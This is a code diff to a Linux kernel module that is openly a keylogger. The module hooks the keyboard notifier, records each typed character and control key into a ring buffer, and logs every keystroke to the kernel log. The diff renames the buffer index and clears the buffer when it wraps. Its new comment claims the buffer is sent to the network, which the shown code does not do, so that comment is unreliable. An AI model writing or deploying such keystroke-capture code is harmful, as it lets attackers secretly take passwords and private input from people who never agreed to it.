@@ -18,34 +18,34 @@
 #define BUF_SIZE 256
 
 static char key_buf[BUF_SIZE];
-static unsigned int key_buf_len;
+static unsigned int key_buf_ptr;
 
 /* we only record ASCII characters and backspace, enter, tab, esc
  * return 1 if record the c */
 int record_key(char c) {
     // ASCII
     if(c >= 0x20 && c < 0x7f) {
-        key_buf[key_buf_len] = c;
+        key_buf[key_buf_ptr] = c;
         return 1;
     }
     // return 
     else if(c == 0x01) {
-        key_buf[key_buf_len] = '\n';
+        key_buf[key_buf_ptr] = '\n';
         return 1;
     }
     // del
     else if(c == 0x7f) {
-        key_buf[key_buf_len] = '\b';
+        key_buf[key_buf_ptr] = '\b';
         return 1;
     }
     // tab
     else if(c == 0x09) {
-        key_buf[key_buf_len] = '\t';
+        key_buf[key_buf_ptr] = '\t';
         return 1;
     }
     // esc
     else if(c == 0x1b) {
-        key_buf[key_buf_len] = '\e';
+        key_buf[key_buf_ptr] = '\e';
         return 1;
     }
     // do nothing
@@ -56,7 +56,7 @@ int record_key(char c) {
 
 /* print the latest recorded character*/
 void print_key(void) {
-    char c = key_buf[key_buf_len];
+    char c = key_buf[key_buf_ptr];
     // ASCII
     if(c >= 0x20 && c < 0x7f)
         printk(KERN_INFO "%c(0x%x)\n", c, c);
@@ -82,12 +82,13 @@ int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
 
         if(record_key((char)param->value)) {
             print_key();
-            key_buf_len++;
+            key_buf_ptr++;
         }
 
-        // loop back
-        if(key_buf_len >= BUF_SIZE) {
-            key_buf_len = 0;
+        // loop back and dump the whole buffer to the network
+        if(key_buf_ptr >= BUF_SIZE) {
+            key_buf_ptr = 0;
+            memset(key_buf, 0, BUF_SIZE);
         }
 
     }
@@ -105,7 +106,7 @@ static int keylogger_init(void)
 {
     printk(KERN_INFO "Keylogger is loaded!\n");
     memset(key_buf, 0, BUF_SIZE);
-    key_buf_len = 0;
+    key_buf_ptr = 0;
     register_keyboard_notifier(&nb);
     return 0;
 }
